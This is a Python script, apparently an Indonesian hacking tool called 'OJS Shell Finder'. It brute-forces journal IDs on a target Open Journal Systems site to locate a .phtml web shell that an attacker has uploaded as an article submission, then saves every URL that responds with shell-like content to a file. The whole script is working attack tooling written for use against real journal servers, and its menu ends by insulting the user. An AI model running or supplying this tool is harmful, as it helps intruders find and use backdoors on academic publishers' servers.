import requests
import colorama
import os
from requests import Session
from colorama import Fore

def clear_screen():
    os.system('clear') if os.name == 'posix' else os.system('cls')

session = Session()

def print_banner():
    print(f"""{Fore.YELLOW}
   ___       ___              ___     ____     ______
  / _ \___ _/ _/__ ____ __ __/ _/__ _/ __ \__ / / __/
 / , _/ _ `/ _/ _ `/ -_) // / _/ _ `/ /_/ / // /\ \  
/_/|_|\_,_/_/ \_,_/\__/\_, /_/ \_,_/\____/\___/___/  
                      /___/ {Fore.WHITE}OJS Shell Finder (2.xx & 3.xx)\n
{Fore.WHITE}[1] Open Journals System Versi 2.xx\n[2] Open Journals System Versi 3.xx""")

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'http://www.google.com',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

def find_ojs_v2():
    try:
        url = input("Target (contoh: https://example.com): ")
        custom_dir = input("Directory (contoh: files): ")
        filename = input("Filename (contoh: 31337-1234-5-SM.phtml): ")
        id = input("Submission ID (contoh: 31337): ")
        print("\n")
        for i in range(0, 1000):
            r = session.get(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/original/{filename}', headers=headers)
            if 'Shell' in r.text or 'shell' in r.text or '-​r​w​-r​--r​--' in r.text or 'Upload' in r.text or 'SSI' in r.text or '<?php' in r.text or '<?' in r.text or 'Command' in r.text:
                print(f'{Fore.GREEN}{url}/{custom_dir}/journals/{i}/articles/{id}/submission/original/{filename}{Fore.GREEN} -> FOUND! (saved as: ojs_shell.txt){Fore.WHITE}')
                with open("ojs_shell.txt", "a+") as f:
                    f.write(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/original/{filename}\n')
            else:
                print(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename} {Fore.WHITE}->{Fore.RED} NO{Fore.WHITE}')
    except Exception as e:
        print(e)

def find_ojs_v3():
    try:
        url = input("Target (contoh: https://example.com): ")
        custom_dir = input("Directory (contoh: files): ")
        filename = input("Filename (contoh: 1175-Article Text-3283-1-2-20230728.phtml ganti jadi 1175-1(INIBISADIRUBAH)-3283-1-2-20230728.phtml): ")
        id = input("Submission ID (contoh: 1175): ")
        print("\n")
        for i in range(0, 1000):
            r = session.get(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename}', headers=headers)
            if 'Shell' in r.text or 'shell' in r.text or '-​r​w​-r​--r​--' in r.text or 'Upload' in r.text or 'SSI' in r.text or '<?php' in r.text or '<?' in r.text or 'Command' in r.text:
                print(f'{Fore.GREEN}{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename}{Fore.GREEN} -> FOUND! (saved as: ojs_shell.txt){Fore.WHITE}')
                with open("ojs_shell.txt", "a+") as f:
                    f.write(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename}\n')
            else:
                print(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename} {Fore.WHITE}->{Fore.RED} NO{Fore.WHITE}')

    except Exception as e:
        print(e)

clear_screen()
print_banner()
option = int(input("Pilih: "))

if option == 1:
    find_ojs_v2()
elif option == 2:
    find_ojs_v3()
else:
    print("Pilih yang bener, goblok!")
